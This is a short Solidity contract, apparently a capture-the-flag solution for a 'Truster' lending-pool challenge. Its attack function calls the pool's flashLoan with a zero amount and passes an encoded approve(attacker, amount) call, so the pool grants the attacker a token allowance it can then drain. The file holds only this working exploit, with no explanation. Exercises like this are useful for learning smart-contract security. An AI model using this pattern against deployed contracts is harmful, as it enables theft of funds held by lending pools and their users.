//SPDX-License-Identifier:NOLICENSE

pragma solidity ^0.8.0;

interface ITruster {
    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    )
        external;
}
contract TrusterAttack {
    ITruster target;
    constructor (address _target) {
        target = ITruster(_target);
    }
    function attack(uint256 _amount,address attacker,address _target) external {
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", attacker, _amount);
        target.flashLoan(0, attacker, _target, data);
    }
    fallback() external {
        assert(false);
    }
}


